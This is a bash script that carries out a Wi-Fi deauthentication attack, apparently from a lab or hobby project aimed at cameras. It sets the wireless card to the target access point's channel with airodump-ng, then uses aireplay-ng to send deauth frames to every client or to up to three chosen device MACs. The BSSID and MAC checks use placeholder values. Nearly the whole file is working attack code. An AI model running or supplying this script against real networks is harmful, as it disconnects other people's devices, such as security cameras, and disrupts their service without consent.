#! /bin/bash

## this script performs the attack
## this script should also be run as sudo

##--------------------------- GLOBAL VARS ---------------------------
bssid_ret=-2
chn_ret=-1
chck_mac=-1

## function to check if arguemnt is corrent bbsid
check_bssid() {
  bssid_ret=2
  echo "Checking BSSID"
  ## normalize inputed bbsid
  norm_bssid=$(echo "$1" | awk '{print tolower($0)}')
  if [ "$norm_bssid" != "FIX:INSERT CORRECT BSSID HERE" ]; then
    echo "Incorrect BSSID"
    bssid_ret=-2
  else
    bssid_ret=2
  fi
}

##--------------------------- HELPER FUNCS ---------------------------
invalid_channel() {
  echo "Invalid Channel"
}

check_channel() {
  echo "Checking Channel"
  chn_ret=3
  ## check that is an nonegative integer
  if ! [[ $1 =~ ^[0-9]+$ ]]; then
    invalid_channel
    bssid_ret=-3
  fi

  ## check that is in the correct bounds
  if (($1 > 15)); then
    invalid_channel
    bssid_ret=-3
  fi
}

set_channel() {
  tmux new-session -d -s ses "airodump-ng -c $1 wlan1"
  sleep 2
  tmux send-keys -t ses C-c
}

check_mac() {
  norm_mac=$(echo "$1" | awk '{print tolower($0)}') ## nomarlize mac
  ## check if mac given is from one of the cameras
  if [[ "$norm_mac" == "FIX:INSERT_YOUR_MAC_HERE" || "$norm_mac" == "FIX: INSERT YOUR MAC ADDRESS HERE" ]]; then
    chck_mac=1 ## set flag if it is
  else
    echo ""$1" is not a device conected to the network!...DROPPING MAC from attack!"
  fi
}

##--------------------------- EXPLOIT ---------------------------
## if there are only two arguemnt, they are considered channel and BSSID and we just deauth eveything connected to that AP
if [ $# -lt 2 ]; then
  echo "USAGE = ./deauth_attack <channel> <bssid> [<DEVICE MAC>]"
  exit -1
fi

## check that channel is valid
check_channel "$1"
if [ $chn_ret -lt 0 ]; then
  exit -1
fi

## check if bssid is correct
check_bssid "$2"
if [ $bssid_ret -lt 0 ]; then
  exit -2
fi

## set channel to correct place
set_channel $1 ## set atticking wifi card to AP's channel

## If only two arguments are given, then send deauth to broadcast
if [ $# -eq 2 ]; then
  aireplay-ng --deauth 50 -a $2 wlan1 ## deauthenticate everything
  echo "50 DEAUTH FRAMES SENT.. IF STILL CONNECTED YOU MAY SEND MORE"
  exit 3
fi

## If more than two arguemts are given, then target specific MACs
num_macs=$(($# - 2))

if [ $num_macs -gt 3 ]; then
  echo "Too many MAC addresses provided!"
  exit -3
fi

## create array of MACs to deauth
mac_array=()

for ((i = 3; i <= $num_macs + 2; i++)); do
  check_mac "${!i}" ## onlyu add to array if mac is valid
  if [[ $chck_mac -gt 0 ]]; then
    mac_array+=("${!i}")
    chck_mac=-1
  fi
done

array_size="${#mac_array[@]}" ## check the number of valid MACs

if [ $array_size -eq 0 ]; then
  echo "NO VALID MACs to attack!...EXITING."
  exit -4
fi

cntr=0
## send deauth packages to given mac
for elem in "${mac_array[@]}"; do
  echo "DEAUTHING $elem....."
  tmux new-session -d -s ses$cntr "aireplay-ng --deauth 20 -a $2 -c "$elem" wlan1"
  ((cntr++))
done
sleep 6
## clean up tmux instances
for ((i = 0; i < $cntr; i++)); do
  tmux send-keys -t ses$i C-c
done
